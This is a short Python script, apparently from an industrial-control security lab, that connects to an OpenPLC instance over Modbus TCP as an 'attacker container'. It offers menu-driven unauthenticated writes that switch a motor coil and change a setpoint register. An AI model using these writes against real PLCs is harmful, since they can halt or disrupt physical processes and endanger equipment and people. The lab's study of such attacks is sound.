from pymodbus.client.sync import ModbusTcpClient

PLC_HOST = "host.docker.internal"
PLC_PORT = 1502
UNIT_ID = 1

client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

print("Connecting to OpenPLC...")

if not client.connect():
    print("ERROR: Could not connect to OpenPLC")
    raise SystemExit(1)

print("Connected to OpenPLC.")
print("Attacker container ready.")
print()
print("Available controlled tests:")
print("1 - Write Motor coil = FALSE")
print("2 - Write Setpoint = 0")
print("3 - Write Motor coil = TRUE")
print("4 - Write Setpoint = 100")
print("")

try:
    choice = input("Enter test number: ").strip()

    if choice == "1":
        result = client.write_coil(0, False, unit=UNIT_ID)
        print("Test completed: Motor coil written FALSE")

    elif choice == "2":
        result = client.write_register(0, 0, unit=UNIT_ID)
        print("Test completed: Setpoint written 0")

    elif choice == "3":
        result = client.write_coil(0, True, unit=UNIT_ID)
        print("Test completed: Motor coil written TRUE")

    elif choice == "4":
        result = client.write_register(0, 100, unit=UNIT_ID)
        print("Test completed: Setpoint written 100")

    else:
        print("Invalid test number.")

finally:
    client.close()
    print("Disconnected from OpenPLC.")
